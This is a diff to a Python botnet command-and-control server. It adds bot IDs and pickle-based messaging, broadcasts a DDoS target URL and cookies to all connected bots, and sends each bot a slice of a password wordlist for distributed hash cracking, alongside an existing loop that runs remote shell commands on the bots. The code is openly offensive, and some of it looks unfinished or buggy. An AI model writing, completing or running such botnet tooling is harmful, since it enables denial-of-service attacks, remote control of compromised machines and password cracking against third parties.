@@ -5,6 +5,7 @@ import os
 #For clean exit we use sys
 import sys
 import threading
+import pickle
 import multiprocessing as Process
 
 class CnC:
@@ -14,8 +15,12 @@ class CnC:
         self.port = 9999
         self.Ccomand = ''
         self.Active = []
+        #Client Sockets
         self.sockets = []
         self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.id = 1
+        #1 for Commands 2 for DDoS 3 for Hashcracker
+        self.option = 0
         #This is not the fix for freeing up socket
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     
@@ -27,15 +32,14 @@ class CnC:
         except socket.error:
             print("Could not create socket for the server")
             sys.exit()
-        id = 1
         while True:
             client_socket, addr = self.socket.accept()
             self.Active.append(addr)
-            self.sockets.append((id,client_socket,addr))
+            self.sockets.append((self.id,client_socket,addr))
             client_thread = threading.Thread(target=self.handler,args=(client_socket,addr))
             print("Starting a new thread")
             client_thread.start()
-            id += 1
+            self.id += 1
         os.remove("temp")
     
     def handler(self,client_socket,addr):
@@ -52,8 +56,9 @@ class CnC:
                 client_socket.send(b"ACK")
         with open("temp","a+") as t:
                 t.write(str(addr[0]) + ':' + str(addr[1])+'\n')
-        #temporary code (Problem is running things in parallel)
-        self.options(client_socket,addr)
+        if self.id == 2:
+            print("Flag")
+            self.options(client_socket,addr)
     def options(self,client_socket,client_addr):
         while True:
             self.Ccommand = input("<*> ")
@@ -73,9 +78,9 @@ class CnC:
                 self.send()
             #For DDoS
             elif self.Ccommand == 'anhilate':
-                query = self.anhilate()
+                self.anhilate()
                 #Check how to send the query for DoS
-                client_socket.send(query)
+                #client_socket.send(query)
             elif self.Ccommand == 'hashcracker':
                 self.hashcracker()
             #In working
@@ -85,6 +90,9 @@ class CnC:
                 self.disengage()
         #client_socket.close()
 
+    def split(self,list_a, chunk_size):
+        for i in range(0, len(list_a), chunk_size):
+            yield list_a[i:i + chunk_size]
     
     def list(self):
         x = 1
@@ -107,7 +115,8 @@ class CnC:
             #command = input("<*SHELL*> ")
             if (command.lower() != ('terminate' or 'exit')) or (command != ""):
                 #print(command)
-                client_socket.send(bytes(command,'utf-8'))
+                self.option = 1
+                client_socket.send(pickle.dumps((self.option,command)))
                 print(client_socket.recv(4096).decode(),end="")
             elif command.lower() == 'terminate' or 'exit':
                 break
@@ -128,13 +137,28 @@ class CnC:
                     value = str(input("Enter cookie value: "))
                     if key != '':
                         cookies[key] = value
-            return (url,cookies)
+            for i in self.sockets:
+                i[1].send(pickle.dumps((self.option,url,cookies)))
         if option == '2':
             return 'a'
 
 
     def hashcracker(self):
-        pass
+        temp = []
+        passwd = []
+        with open("chhotawordlist","r") as r:
+            print("Opening File")
+            temp = r.readlines()
+        list_len = len(temp) / (self.id-1)
+        for x in temp:
+            passwd.append(x.strip('\n'))
+        i = 0
+        lists = list(self.split(passwd,int(list_len)))
+        print(len(lists))
+        while i < (self.id - 1):
+            self.sockets[i][1].send(pickle.dumps(lists[i]))
+            i +=1
+        
 
     def update(self):
         pass
@@ -155,3 +179,6 @@ def main():
 
 if __name__ == '__main__':
     main()
+    '''server = CnC()
+    x = [1,2,3,4,5,6,7,8,9]
+    print(list(server.split(x,2)))'''
